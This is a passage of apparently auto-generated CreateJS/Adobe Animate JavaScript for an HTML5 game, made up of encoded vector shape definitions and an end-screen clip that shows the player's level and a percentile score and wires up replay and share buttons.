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");
	this.shape.setTransform(-0.7,-177.3);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFA300").s().p("AD5bZQjBi3iJnWQg6jDgei8Qgci4AIhyQALiQgNiKIgPhtQlYiIhelTQgehqgBhyIAFhcQg/AAhgCaQgwBNgjBNQhvDSi6BLQhdAmhHgEQimgcg7h/QgdhAAEg7QAiAwBUAbIBNASQCNAzCUh4QAugmApgyIAggrQBOiMB7iYIBsh7QgHgjg8gTQgegJgcgDQhskMABkRQABhWALhMIAMg6QCkA2CMDXQBHBsAlBhQCED9CZA9QAwAUAsgDIAjgGIADgmQg2hbgBiPQAAgtAFgtIAFgkQioiUgCh6QgBgnAQgfIARgXQBbg0BWB2QAbAkAXAyQAMAYAGASQANA/AaALQAJADAJgCIAHgDIAAgmQArjFBZgsQAcgOAdADIAYAGQA0A7gVBzQgKA5gVAuQgaAegGAlQgDASACAMQBMDMhiCHQgxBDhAAbQgVAvAfAyQAaAqAlANQBmAlBlCKQAzBEAeA+QA8gJAVAmQALAUgCAUQA4B1DjCMQBxBGBmAvQgnARhKgKQglgFgegJQAFCEgeCMQgPBHgPArQgfhKhZhOIhUg/QArEvH2HKQD8DlDyCoQmmFboHBdQisAeiIAAQhDAAg7gHgAIVHeQgJhFgmiRIgkiEIhvAxQAIBoBeBrQAvA1AtAhIAAAAgAERgOQAvAoA1gFIAAh0Qg0ANg6h6Igxh7QgjDmBeBTgAilhfQgimDgHh2Qg9gfhCgqQiFhVgfg4IgNgIQgQgGgMANQglArAQDWQAKBTA3BjQBtDGDcBTIAAAAgAjf5VIgIAMQgGARAFAWQARBICCBqQAJAHAJAAQASACACgeIgQgmQgUgtgVgjQg4hegtAAQgJAAgJAEgACS4yQgvAdgQBqQAYAAAtARQAVgcAQgjQAfhEgegcIgNgCQgQAAgPAJg");
	this.shape_1.setTransform(-35.8,-524.6);

	this.instance = new lib.Path();
	this.instance.setTransform(-0.8,-548.2,1,1,0,0,0,231.9,230.2);
	this.instance.shadow = new cjs.Shadow("rgba(255,188,39,0.208)",0,0,18);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#FFFEFD").s().p("AE0HZQj6i8gdjIQAAhVARhZQgTACgbAAQgbgBgbgDQgHAvgGA/QgXC8g0BYQhIB7hbA2QgDAKgPAAQgGAAAAgIQBnhQA8iTQAihXAUiNIATh1QhcgYgehCQgTgjABhYQACgfANAAQALAAADAIQBlgQBkAAIAKAAQA0g2AEgHQAAgEgFAAIiYAAQhJA5hzAVQgMAAAAgIQAAgHAOgGQBvgsBzhRQAPAAAAAIQAAAIgEAFIgRASIC8AAQAPAAAAAIQAAAHglAgIg1AwQBFADBLAMQAGgOAMgEQASAEABAaQgBBXgRAwQgXBOh6ARIAACmQAUCtDvDkQgBAJgFAAQgKAAgGgLgAggjQQgJAigIAtQAbAEAWAAQCRAAAYg/QASgQAHhhQhagOhXgCQgdAjgUBKgAjFkuQAGBcASAVQAcAoA8AOQAIglAIgdQAXhOAmgmQhhAAhcAPgACnAqIAAg5QAEgkAPAAQARAAACAkIAAA5QgCAqgPAAQgRAAgEgqg");
	this.shape_2.setTransform(191.3,-816.5);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#FFFEFD").s().p("AEoHUQhCg6hhhhQhohehYg5QhUgugvg+Qgqg4AAg7QAAiUgLhQQAAgIADAAQAGAAAFAIQAVAgAIBAQAIgCALAAICGAAQgLgOAAgoQADgqAFgRIiVAAQgiAAAAgQQAAgRAiAAICqAAQAzg5ACgEQAAgDgFAAIiRAAQhGA0hqATQgLAAAAgIQAAgJAOgFQBqgqBshPQARAAAAAJQAAAIgFAEQgIAKgLAJICoAAQAMAAAAAHQAAAIgbAgIgqAxIBoAAQA6AAAAAmIAABfQAAAtg+AAIkuAAIgNgBQAFAuAAA6QAABkB+BFQBlBGBaBSQBcBSBgB/QAAAIgFAAQgHAAgGgKgAgUj5QAAAsgHAKICMAAQAbAAAAgTIAAhRQAAgNgVAAIiYAAQANAWAAAlg");
	this.shape_3.setTransform(99.2,-816.2);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f("#FFFEFD").s().p("AE4HsQhChshrhTIh2hQQgpAoglAeQhNBEhtCGQgGAJgGgBQgEABAAgLQBKh3CGiLIAogiIg8gpQhLg+gchdQAAgGADAAQAFAAACAEQAvBIBZBDIArAeQByh2AjhjQAAgLgJAAIlCAAIgGgBQgIA7gYAwQgiBFg8AYQgIAGgHgBQgIAAgBgDQAlgWAfgzQAlg/AHhBQAJg3A2g4QAFgGAEAAQAFAAAAAIQgRAZgPAxIFbAAQAVADgBALQgHB7iQCUQBFAvAzApQB+BuAbBmQABALgGAAQgCAAgEgLgABRiSQhAgPhSgMQgngJAAgfQABgfAUgpQAFgKAGAAQALAAAAALIgGA/QAAATAiACQBFAJBOAVQAyAOAjARQA9AgAAAJQAAALgNAAQhRgnhVgUgAkjh5QAAgFAIgFQBQgtAihcQADgTAHAAQAMAAAAATQAABoiFAxQgLAAAAgGgAkZjNQAQgxAAgYQAAgogKgoQABgJAFAAQAHAAADAJQAQAOAHASQAigIAigDIgGgGQgogfAAgaQAAhFCYgCICPgCQBUAAA4gcQAJAAAAAGQAAAFgFABQgnAig1AKQAKAiAiAkQgCAJgKAAQgJAAgNgOQgngegOgfIgTABIhZABQALAhAZAiQgCAJgKgBQgGAAgNgNQgjgbgOgiQh6AGAAAmQAAATAaAgIgBAFQBQgJBJAAQBzAAB5APQAKgSAYgQQAFAAAAACQAAADgDAFQgIAmAAAhQAAAOACAUQAEAUAFAWQAAAFAAABQgHAAgDgEQgRgMgMgbQgLgWAAgZIAAgHQhvgMh0AAQhuAAhvARIABALQAAAugjAhQgGAKgHAAQgFAAAAgKgACAjwIAAgOQAFgjANAAQASAAACAjIAAAOQgCAogPAAQgQAAgFgogAARj6IAAgHQAFgkAOAAQAPAAADAkIAAAHQgCApgOAAQgQAAgFgpg");
	this.shape_4.setTransform(9.6,-815.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f("#FFFEFD").s().p("AB2HaQgHgwgDiMQAAjjAgiBQgNhsgFh8IhfAAIAJAVIAKArIAdgQQAHgEADAAQATAAAAASQAAADgIAFIgtAbQACATAAATQAACkg8CrQhDDBhEBiQgGAIgDAAQgHAAAAgKQBAh7A2izQAyihACixQgvAagnASQgIAEgFAAQgPgCAAgQQAAgDAGgEIBqg7QgDgVgGgQQgGgZgFgVIhTAAQgUAAAAgPQAAgPAbgBIBEAAQgHgiAAgVQAAgQAHgMIguAAQgcAAAAgQQAAgNAWAAIAxAAQAyAAAvggQAHAAAAAIQAAADgFAHQgcAmg0AEIgBAMQAAAUALAnIAGANIBrAAIgBgYQABhWAWgjQAGgIAFgBQAFAAAAAIQACAvAABPIAAAUIB0AAQAYABAAAPQAAAPgTAAIh4AAQAEBTAEA9QAohUA/gSQAJAAAAAFQAAADgPAHQgyAvgmB7QAKBfARBPQArDXBUCZQAAAIgHAAQgIAAgUgcQhLiAg5jdIgIgxQgKBggFBxQAACEgIBLQgDAXgGAAQgFAAgDgOgAk5HaQgIhbAAhWQAIitBJi+QgughgfgpQgOgRgBgSQAAgRAHgPQAuh9AUhSIghAAQgaAAAAgSQAAgNAdAAIAlAAIAGgXQAAgJAHgEQAHAAACAQIgBAUIBiAAQAOADAAAPQgCDEhKCgQAiAcAdAUQASAKAAAIQAAAHgSAAQgqgTgigZQhFCwgSCkQgGBOAABhQAAAPgGAAQgFAAgBgOgAkbjIQgFANgBAIQAAAKAEAEQATAfAmAjQBFiaAWibQgDgGgKAAIhTAAQgIBagqB8gADUmNIAAgrQAEgjAPAAQARAAACAjIAAArQgCApgPAAQgRAAgEgpg");
	this.shape_5.setTransform(-87.9,-815.7);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#FFFEFD").s().p("Ak0HdQgIhXAAhaQAIiuBKi9QgugigggpQgOgPgDgUQABgQAHgPQAvh4AVhXIgjAAQgZAAAAgSQAAgNAcAAIAnAAIAFgXQgBgJAJgFQAHAAACARIgBAUIBkAAQAOADAAAOQgCDGhKCeQAcAYAjAYQARALAAAHQAAAIgRgBQgsgSgigZQhFCwgUCkQgFBOAABhQAAAPgGAAQgEAAgCgOgAkWjFIgHAVQAAAJAFAEQAWAiAkAhQBGiZAXicQgEgGgJAAIhVAAQgKBfgpB3gABsHIQgMgzAAjZQACiaAChCQg/AAhBAHQAEAZABAhIAABqQgFCrhBBeQgDAIgHAAQgFAAAAgGQAwhqABihIAAhqQAAhJAFgmQAAgHAEAAQAFAAACAHQAEAIAFAPQA9gGBKgCIACgcIACgFQhSgHgUhJQgHgcAAhFQACgcAKAAQAJAAAEAKQAzgHAuAAQAqAAAlAGQAGgNALgFQAQAGAAAVQAABGgIAmQgOBMhVADIABADIADAeQBOABBBALIAEgQQABgIAFAAQAEABAAAHQABArAACNQAACpAtB+QgBAKgEAAQgFAAgHgKQhAhtgDi4QAEhSAMg8QhFgJhAAAQAIBYAACEQAADwgKAfQgDAWgHgBQgFgCgEgWgAAakCQADBBAHAPQAUAxA5AAQA+AAALgxQAGgLADhHQgsgFgjAAQgvAAgrAHgAhdj5QAMggAAgmQAAgkgJgjQAAgHAGgBQAHABAFAHQAKAJAFAKIAmgGQAGgXAAgVQAAgfgLgYQAAgJAIAAQAHAAAFAJQAaARAAAqQAAAYgQANQAwgFAhAAQABhNAGgJQADgKAEgBQAKAAACALQALAJABBNQAqAAA1AEQgagPAAgYQAAgnAYgXQAEgIAGAAQAHAAAAAIQgFAdAAAcQAAAWAHAUIAAADQAdACAcAEQAHgJAKgIQAEgHAHgBQAFABAAAHQgPAbAAAcQAAAoAPAnQAAAHgDABQgEAAgHgHQgkgdAAgtQAAgKACgGQhTgIhbAAQhPAAhKANIADAbQAAApghAZQgGAIgEAAQgFAAAAgJg");
	this.shape_6.setTransform(-193,-815.9);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgqIgBAaQgCAhgKAhQgcBphPBHQgMAKgQAEIgIABQgNAAABgPg");
	this.shape_7.setTransform(-4,-296.3);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape_8.setTransform(-33.6,-296.3);

	this.shape_9 = new cjs.Shape();
	this.shape_9.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAJgJAKAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgKAAgJgJg");
	this.shape_9.setTransform(-57.1,-260.9);

	this.shape_10 = new cjs.Shape();
	this.shape_10.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_10.setTransform(-21.6,-254.4);

	this.shape_11 = new cjs.Shape();
	this.shape_11.graphics.f().s("#000000").ss(0.5).p("AgTgbIAoA3");
	this.shape_11.setTransform(-44.1,-246.8);

	this.shape_12 = new cjs.Shape();
	this.shape_12.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_12.setTransform(-44.1,-246.8);

	this.shape_13 = new cjs.Shape();
	this.shape_13.graphics.f("#FFA300").s().p("ADTHRIoXgCQhFgGg8gPQjAgwgdh7QgOgrAShEQAkiJCgh4QAIhPAphWQBSirCjgfIAIARQAIAYACAfQAFBgg8B+IA3ADQAKhCAohDQBOiFCOgEIAHAXQAIAdACAfQAJBkguBUQBegEBsAcQDZA3BHCfQAVgKAYABQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAg");
	this.shape_13.setTransform(-1,-274.2);

	this.shape_14 = new cjs.Shape();
	this.shape_14.graphics.f("#2B2D30").s().p("Ag3D7QhhgChMgyQg/AvhVgCQhbgCg+g3Qg/g4AChNQAChLBAg1QBBg1BaACQAcABAeAHQAmg+BHgkQBJglBUACQBaACBLAuQBIAsAfBHQAcgHAeABQA8ABAyAfQAwAdAVAtQAMgCALAAQAuABAgAcQAfAdgBAnQAAAnghAbQgiAbgtgBQgeAAgagOQgdAbglAOQgoAOgrgBQhNgBg5gvQhTA7hpAAIgHAAg");
	this.shape_14.setTransform(247,-627.6);

	this.shape_15 = new cjs.Shape();
	this.shape_15.graphics.f("#3E4149").s().p("AgVBiQgmgBgegUQgYASgiAAQgjAAgZgWQgYgWAAgeQABgdAagUQAZgVAjABQAMAAALADQAPgYAbgOQAdgPAhABQAiABAdARQAdASAMAbQAKgCAMAAQAYABATALQATAMAJAQIAIAAQASAAANALQANALgBAQQAAAPgNALQgNAKgSAAQgMAAgKgGQgYAXgigBQgegBgXgSQgfAXgoAAIgEAAg");
	this.shape_15.setTransform(-235.6,-177.8);

	this.shape_16 = new cjs.Shape();
	this.shape_16.graphics.f("#3E4149").s().p("AhfGuQhTgBhNgYQhLgXg/gqQgzAnhBAUQhCAVhIgBQiagEhrhfQhshgADiDQADiCBvhaQBvhbCbADQAwABAzANQBBhqB5g+QB9hACSAEQCbADB/BOQB8BMA3B6QAugLAzAAQBoADBVAzQBSAzAlBOQAUgDATAAQBOACA3AwQA3AxgCBDQgBBDg5AvQg5AuhOgBQg0gCgsgXQgwAthCAZQhDAZhLgCQhCgBg8gWQg6gWgtgmQhFAyhVAaQhTAZhVAAIgNAAg");
	this.shape_16.setTransform(-204.8,-278.2);

	this.shape_17 = new cjs.Shape();
	this.shape_17.graphics.f("#2B2D30").s().p("AhVF+QiTgDh1hNQguAjg5ASQg7AShAgBQiIgDhghVQhfhVACh1QAChzBjhQQBjhRCJADQAvABApALQA7heBrg3QBvg4CBADQCKADBxBFQBvBEAwBrQApgJAtAAQBdACBLAuQBKAtAgBFQAOgCAUAAQBGABAxArQAxAsgCA7QgBA8gzApQgxAphHgBQgvgBgmgVQgrAog6AWQg8AWhDgBQg6gBg1gUQg0gTgogiQg+AthLAXQhIAWhMAAIgNAAg");
	this.shape_17.setTransform(108.7,-38.3);

	this.shape_18 = new cjs.Shape();
	this.shape_18.graphics.f("#35373A").s().p("AhGE/Qh6gChjhBQgmAdgvAPQgyAPg1gBQhygChQhHQhPhHAChhQAChgBThDQBShDByACQAlABAlAJQAxhOBZguQBcgvBsADQByACBfA6QBcA4AoBaQAjgIAlABQBNABA/AnQA9AlAbA5QARgCAMAAQA6ABApAkQAoAkgBAyQgBAygqAiQgqAjg6gCQgmAAghgSQgkAigwASQgyASg4gBQgwgBgtgQQgrgQghgcQgzAlhAATQg9ATg/AAIgJAAg");
	this.shape_18.setTransform(-79.3,-738.2);

	this.addChild(this.shape_18,this.shape_17,this.shape_16,this.shape_15,this.shape_14,this.shape_13,this.shape_12,this.shape_11,this.shape_10,this.shape_9,this.shape_8,this.shape_7,this.shape_6,this.shape_5,this.shape_4,this.shape_3,this.shape_2,this.instance,this.shape_1,this.shape,this.startBtn);
}).prototype = p = new cjs.Container();
p.nominalBounds = new cjs.Rectangle(-306.2,-866.2,612.5,866.3);


(lib.endMC = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		var endObj = this;
		
		endObj.dateUp =function(){
			//endObj.shareMc.visible = false;
			endObj.guankaTxt.text = guanka;
			perNum = 1+ parseInt(guanka/0.88);
			if(perNum>99){perNum = 99;}
			endObj.pTxt.text = perNum+"%";
			dp_submitScore(guanka,perNum);
			document.getElementById('moregame').style.display='block';
		}
		
		endObj.replayBtn.addEventListener("click", showIntroMCf);
		endObj.shareBtn.addEventListener("click", showShare2);
		//endObj.shareMc.addEventListener("click", closeShare.bind(this));
		function showIntroMCf(){
			showHome2();
		}
		
		
		
		function showShare2(){
			dp_share();
		}
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(1));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFFEFD").s().p("AgoERQgPgSAAgVQABgXAOgRQAQgQAYAAQAXAAARAQQAQASAAAWQgBAYgOAPQgRARgYAAQgXgBgRgQgAgbCRQgLgOABgZIgJlPQgCgdAOgRQAPgOATAAQAZABAMAOQAMASgBAbIgKFPQgBAagMAMQgMANgPAAQgOgBgLgLg");
	this.shape.setTransform(156.5,-512.2);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFFEFD").s().p("AhIFjQgUgBglgKQgWgFgKgQQgGgQADgQQAGgSAOgIQAQgJAVAFQAfAHAKAAQAMACARgBQALgBAJgJQAKgJgBgTIAAjbIjVAAQgqgGgQgVQgRgYAOgrIA+jEQABgGADgEIAFgHQABgEACgBQAJgMAPAAIADAAQAAAAABAAQAAgBAAAAQABAAAAAAQABAAAAAAIABAAIACAAQBVgDB5gMQB5gMA6gOQAUgDAOAHQAPAJAEASQAFATgIAQQgGAPgXAFQg8ARhkAJQh+AOhbADIgsCBQgDALADAGQAFAGAKABICnAAIAAhWQAAgWAKgNQALgMAUgBQASABAMALQANAOAAAWIAABWIC7AAQAVAAANAMQAMAMABATQgBASgLALQgOAMgVAAIi7AAIAADxQAAAegLATQgLAXgXAPQgUAOgVACIgcAAQgVAAgNgBgAEvEyQgSgEgOgSQhHhag3gvQgRgOgCgTQgBgQAMgRQANgOASgBQASgBARAOQBDA3BJBhQANASgCARQgCASgQANQgNAKgNAAIgHgBgAlGElQgRgJgHgTQgGgRAFgOQAHgPAagMQArgWAfggQAfgfAXgpQAMgUARgFQARgEAQAIQARAKAFARQAFARgMAVQggA0grArQgzAygyAVQgMAFgKAAQgIAAgHgDg");
	this.shape_1.setTransform(99.4,-509);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#FFFEFD").s().p("AjxFiQgMgOAAgVIAAqBQAAgUALgLQANgMATAAQARAAANAMQANAMAAATIAAB3QAJgIAJgCQARgDAMAHQANAJADARIAeCJQACAKgCAKIB/AAIAAiFIhUAAQgWAAgOgMQgLgNgBgSQACgTALgMQAPgMAUABIBUAAIAAhHQAAgWAMgOQANgMASAAQASABAMALQANANAAAXIAABHIBSAAQAkAAASAUQATAVAAAfIAACSIAdAAQATgBALAMQAMANAAAQQAAATgMAMQgMANgSAAIirAAIAGATQAIAZARAfQARAiAmAoQAiAmA1AjQASANADATQADARgLAQQgMAPgRADQgTACgSgOQgwgmgfghQgtgxgfg2IgJgRIgTAqQgSAggOATQgWAbgRAQQgUAVgbASQgaARgKAEQgUAIgSgFQgQgEgKgRQgHgSAEgQQAGgTAVgJQANgGAQgLQARgKAPgOQATgQARgWQAPgWAMgYQANgbAFgUQAJgZADgVIiAAAQgUAAgLgNQgMgMAAgTQAAgJADgFIgIgEQgOgKgDgQIgXhoIAAHFQAAAVgNANQgLAMgTABQgTgBgMgLgACLghIAAAHIBGAAIAAhpQAAgMgIgIQgJgIgMAAIgpAAgAlNBpQgQgFgJgMQgIgOADgUQAKg1AHhHQAGhPABgRQAAgUALgMQAKgLARAAQARABALAJQAMAMAAAUQgBAXgHBUQgHBIgKA5QgEATgNAKQgJAHgNAAIgIAAg");
	this.shape_2.setTransform(22.5,-509.4);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#FFFEFD").s().p("AjdFjQgMgOAAgVIAAj4QgbAvgcAlQgOARgRACQgPACgPgLQgOgMgCgPQgBgRAMgRQAzg9AZgrQAOgVAUgtIg/AAQgUAAgLgMQgMgNAAgTQAAgSAMgMQALgMAUAAIBKAAIAAhVIg/AEQgTACgOgMQgOgNgBgTQAAgVALgMQALgNAVgBQA6AAA7gJQA2gJAbgJQATgGARAHQAOAJAGASQAGATgHAQQgIAPgTAGQgjAKglAHIAABgIBAAAQATAAAMALQAMAMAAATQAAATgMAMQgMANgTAAIhAAAQBABCAmAtQAKANgBAVQgCAQgOALQgPAJgQgCQgQgCgOgTIgigtIAAEQQAAAUgNAOQgLAMgTABQgUgBgLgLgAEfFcQgkgpgdgsQgmg8gZg+QgJgSgFgSIgMAgQgSAugOAZQgVAmgRAWQgYAggYAWQgaAZgIADQgSAMgTgDQgQgCgMgQQgKgQACgQQAEgUATgMQANgJARgQQASgSAPgUQAUgcARgeQAPgbAQgqQANgnAFggQAKglADgpQAEggAAgnIAAi5QAAgVAMgOQAMgMASgBQATABAMALQANAOAAAWIAAC5IgCAVIAAAPQADAkACASQAGArAJAfQAHAgARAlQAQArAhAxQAeAyAtArQAQAQABASQABARgOAOQgOAOgRABQgTgBgQgQgADzAeQgTgGgIgOQgHgOAFgWQAgh7ADhOQABgXANgMQAMgLAUABQASAAAMANQAMANgBAWQgEBfgiB+QgHATgOAJQgLAGgLAAIgMgBgAgEAQQgOgNAAgUQgMh8gVhHQgGgVAHgRQAIgPASgFQATgGAMAJQAQAIAGAVQAbBXAKCAQAAAWgKALQgLANgTACIgFAAQgRAAgIgJg");
	this.shape_3.setTransform(-53.9,-509.5);

	this.shape_4 = new cjs.Shape();
